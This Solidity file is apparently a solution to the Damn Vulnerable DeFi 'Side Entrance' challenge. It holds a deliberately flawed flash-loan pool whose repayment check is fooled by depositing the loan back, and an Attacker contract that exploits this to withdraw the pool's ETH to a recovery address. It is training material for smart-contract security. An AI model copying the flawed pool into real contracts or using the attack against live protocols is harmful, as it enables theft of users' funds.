// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

contract SideEntranceLenderPool {
    mapping(address => uint256) public balances;

    error RepayFailed();

    event Deposit(address indexed who, uint256 amount);
    event Withdraw(address indexed who, uint256 amount);

    function deposit() external payable {
        unchecked {
            balances[msg.sender] += msg.value;
        }
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];

        delete balances[msg.sender];
        emit Withdraw(msg.sender, amount);

        SafeTransferLib.safeTransferETH(msg.sender, amount);
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance; // balance of contract before flashloan

        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}(); //sending amount requested to IFlashLoanEtherReceiver
        //msg.sender is an attacker contract so IFlashLoanEtherReceiver will be an attacker with execute function

        if (address(this).balance < balanceBefore) { // amount after shoul be greater than before
            revert RepayFailed();
        }
    }
}


contract Attacker is IFlashLoanEtherReceiver{
    SideEntranceLenderPool immutable pool;
    address recovery;
    uint256 exploitAmount;
    
    constructor(SideEntranceLenderPool _pool, address _recovery, uint256 _amount) {
        pool = _pool;
        recovery = _recovery;
        exploitAmount = _amount;
    }

    function execute() external payable override{
        pool.deposit{value: msg.value}(); // pool.balance(attacker) = 1000
    } 

    function attack() external returns(bool){
        pool.flashLoan(exploitAmount);
        pool.withdraw();
        payable(recovery).transfer(exploitAmount);
        return true;
    }

    receive() external payable{} // for the attacker to receive ETH on withdraw

}

